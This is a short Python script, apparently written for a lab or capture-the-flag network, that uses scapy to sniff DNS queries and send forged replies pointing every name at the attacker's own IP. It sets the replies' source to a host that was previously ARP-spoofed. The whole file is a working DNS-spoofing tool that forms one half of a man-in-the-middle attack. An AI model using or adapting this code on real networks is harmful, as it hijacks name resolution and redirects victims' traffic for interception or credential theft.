#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid
import datetime
import time

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"   ## see arp-resp.py

def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    req_udp = packet[UDP]
    eth = Ether(src=macaddr, dst="4c:24:57:ab:ed:84")    # need to replace mac addresses
    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed) # need to replace IP addresses
    udp = UDP(dport=req_udp.sport, sport=53)
    req_dns = packet[DNS]                             # need to replace ports
    dns = DNS(
        qr = 1,
        rd=1, 
        id=req_dns.id, 
        qd=req_dns.qd,
        an = DNSRR(rrname = req_dns.qd.qname, ttl = 5, rdata = str(ipaddr))
    )
    # dns_response = eth / ip / udp / dns     # eth wrapping is not needed at DNS level
    dns_response = ip / udp / dns             # without the DNS wrapping
    dns_response.show()
    send(dns_response)

# def pranshu_dns_request(packet):
#     time = datetime.datetime.now()
#     if packet.haslayer(UDP):
#         print(packet.src)
#         print(packet[DNS])
#         print(packet[DNS].id)
#         print(packet[DNS].qr)
#         print(packet[DNS].rd)
#         print(packet[DNS].rcode)
#         print(packet[DNSQR].qname)

# def read_packet():
#     packets = rdpcap("../pcaps/dns.pcap")
#     for packet in packets:
#         print(packet.show())

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    pranshu_packet_filter = "udp dst port 53"           # my filter is a lot less rigid

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=pranshu_packet_filter, prn=handle_dns_request, store=0, iface="eth0")
    # sniff(filter=pranshu_packet_filter, prn=pranshu_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()